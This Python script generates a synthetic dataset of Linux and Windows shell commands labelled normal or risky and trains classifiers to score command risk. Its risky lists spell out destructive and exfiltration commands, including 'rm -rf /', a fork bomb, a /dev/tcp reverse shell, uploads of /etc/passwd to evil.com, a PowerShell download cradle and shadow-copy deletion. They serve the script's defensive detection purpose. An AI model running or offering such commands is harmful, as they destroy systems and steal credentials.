import pandas as pd
import numpy as np
import joblib
import os
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report, roc_auc_score, accuracy_score
from sklearn.ensemble import RandomForestClassifier, RandomForestRegressor
import warnings
import random

warnings.filterwarnings('ignore')

def generate_massive_dataset():
    data = []
    
    # Base lists for Normal (Label 0)
    linux_normal_bases = [
        "ls", "cd", "pwd", "echo", "cat", "nano", "vim", "grep", "find", "df", "du", "free", "top", 
        "ps", "systemctl", "service", "ip", "ping", "curl", "wget", "ssh", "scp", "tar", "zip", "python3", "node", 
        "gcc", "git", "whoami", "uname", "uptime", "hostnamectl", "mkdir", "cp", "mv", "touch", "locate", "which"
    ]
    # Safe Chmod/Chown
    linux_safe_perm_bases = [
        "chmod 644", "chmod 755", "chmod 600", "chmod 400", "chmod 700", "chmod 664",
        "chown user:user", "chown www-data:www-data", "chown root:root /etc/hosts"
    ]
    
    # Base lists for Risky (Label 1)
    linux_risky_bases = [
        "rm -rf /", "rm -rf /etc", "sudo rm -rf /", "rm -f /etc/shadow", "mkfs.ext4 /dev/sda", "dd if=/dev/zero",
        "chown root:root /home/user", "nc -lvp 4444", "bash -i >& /dev/tcp",
        "curl -X POST -d @/etc/shadow", "USERDEL ROOT", "chown root:root /home/user -R", "shred -u", "srm -rf",
        ":(){ :|:& };:", "iptables -F", "history -c"
    ]
    # Dangerous Chmod (requested fix)
    linux_danger_perm_bases = [
        "chmod 777", "chmod -R 777", "chmod 666", "chmod -R 666", "chmod 000", "chmod 4777", "chmod u+s"
    ]
    
    # Windows Normal
    win_normal_bases = [
        "dir", "cd", "echo", "type", "notepad", "ipconfig", "ping", "nslookup", "netstat", "tasklist", "systeminfo",
        "whoami", "net user", "mkdir", "copy", "move", "del /q", "cls", "ver", "wmic", "powershell Get-Process"
    ]
    
    # Windows Risky
    win_risky_bases = [
        "del C:\\Windows\\System32\\*", "rd /s /q C:\\Windows", "format C: /y", "cipher /w:C:", "net user admin /add",
        "reg delete HKLM\\Software", "taskkill /f /im MsMpEng.exe", "vssadmin delete shadows", "bcdedit /set recoveryenabled no",
        "powershell IEX (New-Object Net.WebClient).DownloadString"
    ]

    # Synthetic Generation: Normal Linux (Generic)
    for i in range(150):
        base = random.choice(linux_normal_bases)
        path = random.choice(["/var/log", "/etc/nginx", "/home/user/docs", "/tmp/test", "/usr/local/bin"])
        data.append({
            "command": f"{base} {path}",
            "label": 0,
            "risk_score": random.randint(1, 3)
        })
        
    # Synthetic Generation: Safe Permissions
    for i in range(50):
        base = random.choice(linux_safe_perm_bases)
        path = random.choice(["script.sh", "config.yaml", "index.html", "data.csv", "/etc/config"])
        data.append({
            "command": f"{base} {path}",
            "label": 0,
            "risk_score": random.randint(1, 4)
        })
    
    # Synthetic Generation: Risky Linux (Generic/Breaches)
    for i in range(100):
        base = random.choice(linux_risky_bases)
        extra = random.choice(["--no-preserve-root", "2>/dev/null", "> /dev/null", "&", ""])
        data.append({
            "command": f"{base} {extra}".strip(),
            "label": 1,
            "risk_score": random.randint(8, 10)
        })
        
    # Synthetic Generation: Dangerous Permissions (CRITICAL FIX)
    for i in range(50):
        base = random.choice(linux_danger_perm_bases)
        path = random.choice(["/", "/etc", "/home/user", "/var/www", "backdoor.sh", "id_rsa"])
        data.append({
            "command": f"{base} {path}",
            "label": 1,
            "risk_score": random.randint(7, 9)
        })

    # Synthetic Generation: Normal Windows
    for i in range(150):
        base = random.choice(win_normal_bases)
        path = random.choice(["C:\\Users\\Public", "D:\\Backup", "C:\\Temp", "Documents", "AppData\\Local"])
        data.append({
            "command": f"{base} {path}",
            "label": 0,
            "risk_score": random.randint(1, 3)
        })

    # Synthetic Generation: Risky Windows
    for i in range(100):
        base = random.choice(win_risky_bases)
        extra = random.choice(["/f", "/s /q", "/quiet", "-Force", ""])
        data.append({
            "command": f"{base} {extra}".strip(),
            "label": 1,
            "risk_score": random.randint(8, 10)
        })

    # Add specific "Breach/Exfil" patterns
    exfil_patterns = [
        ("curl -F 'file=@/etc/passwd' http://evil.com", 1, 10),
        ("scp -r /root/.ssh attacker@remote:", 1, 9),
        ("powershell -enc ...", 1, 10),
        ("bitsadmin /transfer ... http://evil.com", 1, 9),
        ("nslookup secret.dns.evil.com", 1, 7)
    ]
    for p, lbl, score in exfil_patterns:
        data.append({"command": p, "label": lbl, "risk_score": score})

    # Real examples and specific user requests
    real_examples = [
        ("chmod 777 /", 1, 10), ("chmod -R 777 /var/www", 1, 9), ("chmod 644 index.html", 0, 1),
        ("USERDEL ROOT", 1, 10), ("chown root:root /home/user -R", 1, 8),
        ("systemctl list-units", 0, 2), ("shred -u secret.txt", 1, 8), ("mimikatz.exe", 1, 10)
    ]
    for cmd, lbl, score in real_examples:
        data.append({"command": cmd, "label": lbl, "risk_score": score})

    df = pd.DataFrame(data)
    return df.sample(frac=1, random_state=42).reset_index(drop=True)
    return df.sample(frac=1, random_state=42).reset_index(drop=True)

def train_best_model():
    df = generate_massive_dataset()
    print(f"Dataset Size: {len(df)}")
    
    # Improved tokenization to catch '777' and '-'
    vectorizer = TfidfVectorizer(token_pattern=r'(?u)\b\w+\b|[\\/:.\-^*&|><]')
    X = vectorizer.fit_transform(df['command'])
    y = df['label']

    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)

    # Train Classifier (Risky vs Normal)
    model = RandomForestClassifier(n_estimators=150, random_state=42)
    model.fit(X_train, y_train)

    # Train Regressor (Risk Score 1-10)
    risk_model = RandomForestRegressor(n_estimators=150, random_state=42)
    # Fit on all data for better coverage, or split if needed. using train/test split for consistency
    # y for regressor is the risk_score, not the label
    y_risk = df['risk_score']
    X_train_r, X_test_r, y_train_r, y_test_r = train_test_split(X, y_risk, test_size=0.2, random_state=42)
    
    risk_model.fit(X_train_r, y_train_r)

    y_pred = model.predict(X_test)
    y_prob = model.predict_proba(X_test)[:, 1]

    print(f"Classifier Accuracy: {accuracy_score(y_test, y_pred):.4f}")
    print(f"Classifier AUC Score: {roc_auc_score(y_test, y_prob):.4f}")
    print(classification_report(y_test, y_pred))
    
    # Evaluate Regressor
    from sklearn.metrics import mean_squared_error
    y_pred_r = risk_model.predict(X_test_r)
    rmse = np.sqrt(mean_squared_error(y_test_r, y_pred_r))
    print(f"Risk Model RMSE: {rmse:.4f}")

    # Save
    if not os.path.exists('ml'): os.makedirs('ml')
    joblib.dump(model, 'ml/best_model.pkl')
    joblib.dump(risk_model, 'ml/risk_model.pkl')
    joblib.dump(vectorizer, 'ml/vectorizer.pkl')
    
    try:
        # Saving as data_refined.csv to avoid locking issues
        df.to_csv('ml/data_refined.csv', index=False)
        print("[SUCCESS] Dataset saved to ml/data_refined.csv")
    except Exception as e:
        print(f"[WARNING] Could not save CSV: {e}")

if __name__ == "__main__":
    train_best_model()
